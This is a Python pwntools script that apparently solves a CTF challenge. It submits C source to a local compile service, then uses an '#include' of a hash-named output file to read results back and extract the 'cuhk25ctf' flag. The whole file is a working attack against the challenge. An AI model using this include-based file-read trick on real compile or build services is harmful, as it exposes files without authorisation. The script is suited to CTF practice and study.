from pwn import *
import hashlib
import random
import time
import re

io = remote('127.0.0.1', 8000)

global s
with open('./sol2.c', 'r') as f:
    s = f.read()
s += f'// {random.randbytes(16).hex()}\n' # Add some randomness to the source so we can keep resubmitting
io.sendafter(b'Enter your C source file: (Type "EOF" in one line to end the file)', s.encode() + b'EOF\n')
time.sleep(2)
io.close()

# Get the sha256hash
outfile = f'../out/{hashlib.sha256(s.encode() + b'\n').hexdigest()}.out' # chall.sh:34: echo "$SRC" adds an extra newline
src = f'''
#include "{outfile}"
'''
io = remote('127.0.0.1', 8000)
io.sendafter(b'Enter your C source file: (Type "EOF" in one line to end the file)', src.encode() + b'EOF\n')

l = io.recvline()
while not (re_match := re.search(b'cuhk25ctf{.*}', l)):
    l = io.recvline()
print(f'FLAG: {re_match.group(0)}')